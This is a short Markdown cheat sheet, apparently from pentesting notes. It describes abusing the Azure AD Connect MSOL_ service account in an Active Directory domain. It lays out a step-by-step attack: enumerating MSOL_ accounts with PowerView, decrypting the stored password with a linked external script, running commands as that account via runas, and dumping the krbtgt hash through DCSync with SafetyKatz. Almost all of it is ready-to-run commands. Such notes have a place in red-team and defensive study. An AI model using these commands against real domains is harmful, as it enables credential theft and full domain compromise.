# Methodology
>1. Enumerate the accounts with the `MSOL_` attribute.
>2. Get administrative privileges on the computer where it's setup.
>3. Read the password.
>4. Run commands as `MSOL_` user.
>5. DCSync (Optional).

---
# Powershell
>**ℹ️ Info:**
>
> Remember to follow the [PowerShell scripts methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#PowerShell%20Scripts).

## PowerView
**Get the MSOL user and the computer where it's setup:**
```powershell
Get-DomainUser -Identity "MSOL_*" -Domain contoso.local
```

**Retrieve the password:**
https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545#file-azuread_decrypt_msol-ps1
```powershell
.\azuread_decrypt_msol.ps1
```

**Run commands:**
```powershell
runas /user:techcorp.local\MSOL_16fb75d0227d /netonly cmd
```

---
# Binaries
>**ℹ️ Info:**
>
> Remember to follow the [binaries methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#Binaries).

## SafetyKatz
**Dcsync:**
```cmd
SafetyKatz.exe '"lsadump::dcsync /user:contoso\krbtgt /domain:contoso.local"'
```